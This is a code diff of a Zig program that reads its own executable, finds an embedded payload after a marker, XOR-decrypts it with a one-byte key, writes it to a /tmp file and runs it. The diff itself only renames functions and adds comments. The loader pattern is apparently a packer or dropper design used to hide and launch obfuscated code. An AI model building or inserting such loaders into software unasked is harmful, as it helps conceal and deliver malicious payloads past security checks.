@@ -6,27 +6,29 @@ const PAYLOAD_START_MARKER = "PAYLOAD_START_MARKER";
 pub fn main() !void {
     const allocator = std.heap.page_allocator;
 
-    // Get and decrypt payload
-    const payload_data = try get_embedded_payload(allocator);
+    // Get the encrypted payload
+    const payload_data = try getEmbeddedPayload(allocator);
     defer allocator.free(payload_data);
 
-    const key = payload_data[0];
+    // Decrypt the payload
+    const key = payload_data[0]; // First byte is the key
     const encrypted_payload = payload_data[1..];
-    const decrypted = try decryptor.xor_decrypt(allocator, encrypted_payload, key);
+    const decrypted = try decryptor.xorDecrypt(allocator, encrypted_payload, key);
     defer allocator.free(decrypted);
 
     // Execute via tempfile
-    try execute_via_tempfile(decrypted);
+    try executeViaTempfile(decrypted);
 }
 
-fn get_embedded_payload(allocator: std.mem.Allocator) ![]u8 {
+fn getEmbeddedPayload(allocator: std.mem.Allocator) ![]u8 {
     const self_binary = try std.fs.cwd().readFileAlloc(allocator, "/proc/self/exe", 100 * 1024 * 1024);
     defer allocator.free(self_binary);
 
+    // Find the PAYLOAD_START_MARKER
     if (std.mem.lastIndexOf(u8, self_binary, PAYLOAD_START_MARKER)) |marker_start| {
         const data_start = marker_start + PAYLOAD_START_MARKER.len;
         const size_bytes = self_binary[data_start .. data_start + 8];
-        const payload_size = std.mem.readInt(u64, size_bytes[0..8], .little);
+        const payload_size = std.mem.readInt(u64, size_bytes[0..8], .little); // payload size is 8 bytes, little endian
 
         const payload_start = data_start + 8;
         const total_payload_size = payload_size + 1;
@@ -37,7 +39,7 @@ fn get_embedded_payload(allocator: std.mem.Allocator) ![]u8 {
     return error.PayloadNotFound;
 }
 
-fn execute_via_tempfile(payload: []const u8) !void {
+fn executeViaTempfile(payload: []const u8) !void {
     var temp_name_buffer: [256]u8 = undefined;
     const temp_name = try std.fmt.bufPrint(&temp_name_buffer, "/tmp/zyra_{}", .{std.time.timestamp()});
 
